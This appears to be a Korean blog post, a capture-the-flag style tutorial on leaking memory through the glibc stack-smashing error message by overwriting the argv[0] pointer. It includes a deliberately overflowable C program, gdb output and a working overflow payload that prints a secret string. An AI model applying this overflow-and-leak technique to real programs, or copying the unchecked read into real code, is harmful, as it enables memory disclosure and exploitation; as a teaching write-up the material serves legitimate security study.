---
layout: post
title: "SSP Message를 이용한 Memory Leak"
date: 2018-11-04
excerpt: "argv[0] 포인터 조작"
tags: [tech]
comments: true
---
```c
#include <stdio.h>

char secret[] = "flag{memory_leaked}";

int main()
{
	char buf[48];

	read(0, buf, 0x400);

	return 0;
}
```
우선 위의 코드를 컴파일하되, Stack Smash Protector을 해제하지 않고 컴파일 합니다.
```
gcc -o leak leak.c -m32 -mpreferred-stack-boundary=2
```

Stack Smash Protector가 적용된 바이너리이므로, Buffer Overflow가 발생해 canary가 훼손되었을 경우

아래와 같이 Stack Smashed Detected라는 메시지를 출력하며 SIGABRT를 띄울 것 입니다.
```
~/pwn/stack/ssp_leak st4nw@trust
❯ (python -c 'print "A" * 200') | ./leak                     
*** stack smashing detected ***: ./leak terminated
[1]    16462 done                 ( python -c 'print "A" * 200'; ) | 
       16463 abort (core dumped)  ./leak
```

여기서 눈여겨 보아야 할 것은 "./leak" 부분입니다. SSP Message는 분명히 argv[0]을 Message에 포함시켜 출력합니다.
 
그렇다면 gdb로 해당 바이너리가 실행될 때 argv[0]을 어디서 가져오는지 알아보겠습니다.
```
pwndbg> disas main
Dump of assembler code for function main:
   0x0804846b <+0>:	push   ebp
   0x0804846c <+1>:	mov    ebp,esp
   0x0804846e <+3>:	sub    esp,0x34
   0x08048471 <+6>:	mov    eax,gs:0x14
   0x08048477 <+12>:	mov    DWORD PTR [ebp-0x4],eax
   0x0804847a <+15>:	xor    eax,eax
   0x0804847c <+17>:	push   0x400
   0x08048481 <+22>:	lea    eax,[ebp-0x34]
   0x08048484 <+25>:	push   eax
   0x08048485 <+26>:	push   0x0
   0x08048487 <+28>:	call   0x8048330 <read@plt>
   0x0804848c <+33>:	add    esp,0xc
   0x0804848f <+36>:	mov    eax,0x0
   0x08048494 <+41>:	mov    edx,DWORD PTR [ebp-0x4]
   0x08048497 <+44>:	xor    edx,DWORD PTR gs:0x14
   0x0804849e <+51>:	je     0x80484a5 <main+58>
   0x080484a0 <+53>:	call   0x8048340 <__stack_chk_fail@plt>
   0x080484a5 <+58>:	leave  
   0x080484a6 <+59>:	ret    
End of assembler dump.
```
leave 부분에 bp를 걸고 스택의 상황을 살펴보겠습니다.

```
pwndbg> search "/home/"
[stack]         0xffffd40d 0x6d6f682f ('/hom')
[stack]         0xffffd44f u'/home/st4nw'
[stack]         0xffffd630 0x6d6f682f ('/hom')
[stack]         0xffffd656 0x6d6f682f ('/hom')
[stack]         0xffffd81e 0x6d6f682f ('/hom')
[stack]         0xffffdf9b 0x6d6f682f ('/hom')
[stack]         0xffffdfd4 0x6d6f682f ('/hom')
pwndbg> x/100x $esp
0xffffd174:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd184:	0xffffd20a	0xffffd24c	0x080484d1	0xf7fae3dc
0xffffd194:	0x0804820c	0x080484b9	0x00000000	0xf7fae000
0xffffd1a4:	0x65bee200	0x00000000	0xf7e14637	0x00000001
0xffffd1b4:	0xffffd244	0xffffd24c	0x00000000	0x00000000
0xffffd1c4:	0x00000000	0xf7fae000	0xf7ffdc04	0xf7ffd000
0xffffd1d4:	0x00000000	0xf7fae000	0xf7fae000	0x00000000
0xffffd1e4:	0xe9a0d030	0xd4885e20	0x00000000	0x00000000
0xffffd1f4:	0x00000000	0x00000001	0x08048370	0x00000000
0xffffd204:	0xf7fee010	0xf7fe8880	0xf7ffd000	0x00000001
0xffffd214:	0x08048370	0x00000000	0x08048391	0x0804846b
0xffffd224:	0x00000001	0xffffd244	0x080484b0	0x08048510
0xffffd234:	0xf7fe8880	0xffffd23c	0xf7ffd918	0x00000001
0xffffd244:	0xffffd40d	0x00000000	0xffffd431	0xffffd43c  --------------> &argv[0]
0xffffd254:	0xffffd44a	0xffffd45b	0xffffd53e	0xffffd553
0xffffd264:	0xffffd566	0xffffd589	0xffffd5c0	0xffffd5d4
0xffffd274:	0xffffd5df	0xffffd5f4	0xffffd613	0xffffd624
0xffffd284:	0xffffd62c	0xffffd64f	0xffffd675	0xffffd68d
0xffffd294:	0xffffd6a3	0xffffd6c3	0xffffd6d6	0xffffd6ea
0xffffd2a4:	0xffffd700	0xffffd714	0xffffd730	0xffffd758
0xffffd2b4:	0xffffd7a6	0xffffd7d4	0xffffd802	0xffffd81a
0xffffd2c4:	0xffffd835	0xffffd840	0xffffd848	0xffffd868
0xffffd2d4:	0xffffddf0	0xffffde05	0xffffde16	0xffffde21
0xffffd2e4:	0xffffde3f	0xffffde53	0xffffde61	0xffffde70
0xffffd2f4:	0xffffde8b	0xffffde9d	0xffffdeab	0xffffdebd
```
syscall 규약에 따라 main 함수의 EBP+8에는 argc가, EBP+12에는 argv의 시작주소의 포인터가 적재됩니다.

```
출처 : http://btyy.tistory.com/229
```
EBP+12에는 현재 0xffffd244가 담겨있고, 0xffffd244에는 0xffffd40d가 담겨있으며 이는 argv[0]의 주소입니다.

여기서 0xffffd244의 값인 0xffffd40d을 flag 문자열의 주소로 덮어쓴다면, SSP Message는 argv[0]을 출력할 때 flag의 주소를 참조하게됩니다.

이는 아래의 결과로 확인할 수 있습니다.

```
pwndbg> r <<< $(python -c 'print "A" * 208 + "\x20\xa0\x04\x08"')
Starting program: /home/st4nw/pwn/stack/ssp_leak/leak <<< $(python -c 'print "A" * 208 + "\x20\xa0\x04\x08"')
*** stack smashing detected ***: flag{memory_leaked} terminated

Program received signal SIGABRT, Aborted.
```

이 기법과 관련된 문제로는 SECCON 2016 CTF의 checker가 있습니다.

* * *
개인적인 생각으로는, 자주 사용될 것 같지는 않지만 fork된 바이너리에서 유용하게 사용될 것 같습니다.
